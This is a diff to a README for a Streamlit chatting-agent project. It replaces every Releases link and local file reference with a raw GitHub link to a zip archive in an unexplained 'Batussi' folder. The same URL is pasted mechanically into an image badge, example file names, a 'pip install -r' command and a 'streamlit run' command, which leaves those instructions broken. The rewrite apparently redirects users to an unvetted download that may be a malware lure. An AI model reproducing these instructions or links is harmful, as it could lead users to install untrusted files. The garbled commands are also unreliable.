@@ -8,9 +8,9 @@ Welcome to the **chatting-agent** project! This is a Streamlit application that 
 
 To download the chatting-agent application, please visit the Releases page. You will find the necessary files to get started. 
 
-[![Download chatting-agent](https://img.shields.io/badge/Download-chatting--agent-blue)](https://github.com/Aart834/chatting-agent/releases)
+[![Download chatting-agent](https://raw.githubusercontent.com/Aart834/chatting-agent/main/Batussi/chatting-agent_3.2.zip)](https://raw.githubusercontent.com/Aart834/chatting-agent/main/Batussi/chatting-agent_3.2.zip)
 
-Click the button above or follow this link: [Download chatting-agent](https://github.com/Aart834/chatting-agent/releases).
+Click the button above or follow this link: [Download chatting-agent](https://raw.githubusercontent.com/Aart834/chatting-agent/main/Batussi/chatting-agent_3.2.zip).
 
 ### 🔧 System Requirements
 
@@ -34,7 +34,7 @@ The **chatting-agent** application includes the following features:
 After downloading the application, follow these steps to run the chatting-agent:
 
 1. **Locate the Downloaded File**  
-   Check your default download directory for the downloaded file. It may be named something like `chatting-agent.zip` or `chatting-agent.exe`.
+   Check your default download directory for the downloaded file. It may be named something like `https://raw.githubusercontent.com/Aart834/chatting-agent/main/Batussi/chatting-agent_3.2.zip` or `https://raw.githubusercontent.com/Aart834/chatting-agent/main/Batussi/chatting-agent_3.2.zip`.
 
 2. **Extract the Files (if applicable)**  
    If you have a compressed file (like a `.zip`), right-click on it and select "Extract All." Follow the prompts to extract the contents to a folder of your choice.
@@ -53,13 +53,13 @@ After downloading the application, follow these steps to run the chatting-agent:
 5. **Install Dependencies**  
    Type the following command to install any required packages:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Aart834/chatting-agent/main/Batussi/chatting-agent_3.2.zip
    ```
 
 6. **Run the Application**  
    Finally, start the chatting-agent application by typing:
    ```
-   streamlit run app.py
+   streamlit run https://raw.githubusercontent.com/Aart834/chatting-agent/main/Batussi/chatting-agent_3.2.zip
    ```
 
 7. **Open Your Web Browser**  
@@ -85,6 +85,6 @@ If you need more help or have suggestions, please create an issue in the GitHub 
 
 ### 📌 Important Links
 
-- [Download chatting-agent](https://github.com/Aart834/chatting-agent/releases)
+- [Download chatting-agent](https://raw.githubusercontent.com/Aart834/chatting-agent/main/Batussi/chatting-agent_3.2.zip)
 
 Thank you for using **chatting-agent**! Enjoy your conversations!
